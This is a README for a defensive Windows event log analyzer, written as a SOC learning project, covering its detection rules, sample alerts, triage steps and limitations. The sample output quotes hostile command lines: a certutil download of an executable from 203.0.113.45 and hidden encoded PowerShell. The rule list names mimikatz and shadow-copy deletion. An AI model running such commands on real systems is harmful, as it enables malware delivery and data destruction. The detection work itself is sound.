# Windows Event Log Analyzer

Python script that reads Windows Security, System and Sysmon-style events exported as JSON lines and finds common attack signs. I made it because a SOC L1 reads Windows event IDs all day, and I wanted to learn which ones matter.

## What it does
- Reads one JSON event per line (EventID, TimeCreated, Data)
- Finds many failed logons (4625) from one IP, and marks it HIGH when 3 or more accounts are tried
- Finds a successful remote logon (4624, type 3 or 10) after those failures
- Finds new user accounts (4720) and users added to Administrators or Domain Admins (4728, 4732, 4756)
- Finds the audit log being cleared (1102)
- Finds new services running from Temp or user folders (7045)
- Finds suspicious command lines in process creation (4688): encoded PowerShell, certutil, mimikatz, vssadmin delete shadows
- Exit code is 1 when something is found, `--json` gives JSON output
- Only uses the Python standard library

## How to run
```
git clone https://github.com/Satish-R01/Cybersecurity-Projects.git
cd Cybersecurity-Projects/08-Windows-Event-Log-Analyzer

python3 winevent.py samples/events.jsonl
python3 winevent.py samples/events.jsonl -f 10
python3 winevent.py samples/events.jsonl --json
```

Options:
- `-f` failed logons from one IP before it alerts (default 5)
- `--json` print alerts as JSON

To make the input file on Windows, something like `Get-WinEvent -LogName Security | ForEach-Object { ... } | ConvertTo-Json -Compress` works. The sample shows the format.

## Output on the sample log
```
$ python3 winevent.py samples/events.jsonl
[!] 8 alert(s) found

SEVERITY  RULE                                 WHO              DETAIL
----------------------------------------------------------------------------------------------------
HIGH      Added to privileged group            support$admin    group Administrators by backup at 2026-11-18T13:25:00 [T1098]
HIGH      Suspicious process: encoded PowerShell backup           powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA [T1059.0
HIGH      Suspicious process: certutil used to download or decode backup           certutil -urlcache -f http://203.0.113.45/a.exe C:\Users\Public\a.e
HIGH      Suspicious new service               WinUpdateSvc     image path C:\Users\Public\a.exe at 2026-11-18T13:30:00 [T1543.003]
HIGH      Audit log cleared                    backup           Security log cleared at 2026-11-18T13:40:00 [T1070.001]
HIGH      Many failed logons                   203.0.113.45     14 failures, 7 account(s) [T1110]
HIGH      Successful logon after failures      203.0.113.45     user backup logged in at 2026-11-18T13:20:10 [T1110]
MEDIUM    User account created                 support$admin    created by backup at 2026-11-18T13:24:00 [T1136.001]
```

The sample file is made up, 32 events. It has:
- normal logons from two users
- 203.0.113.45 trying 7 accounts on RDP, then getting into the backup account
- the new account support$admin added to Administrators
- encoded PowerShell and a certutil download, then a service from C:\Users\Public
- the Security log cleared at the end
- a normal Spooler service and notepad, which should not alert

## What I'd do as L1 after an alert
- Check the source IP on VirusTotal or AbuseIPDB and see if RDP is open to the internet
- Look at what the account did after the successful logon, in time order
- Disable the new account and the compromised account, then escalate to L2 right away
- Get the file from the service path and check its hash
- Isolate the host, a cleared log means the attacker was trying to hide

MITRE ATT&CK: T1110 Brute Force, T1136.001 Create Account, T1098 Account Manipulation, T1059.001 PowerShell, T1543.003 Windows Service, T1070.001 Clear Windows Event Logs.

To prevent it: no RDP from the internet, account lockout policy, MFA, and send logs to a SIEM so clearing the local log does not hide anything.

## Limitations
- Only reads JSON lines, not .evtx files directly
- Failed logon count is not time-windowed, it counts the whole file
- Command line rules are simple text matches, an attacker can change the spelling
- Process creation (4688) needs command line auditing turned on

## Tests
```
pip install pytest
python3 -m pytest tests
```

Satish R - https://www.linkedin.com/in/cybersatish
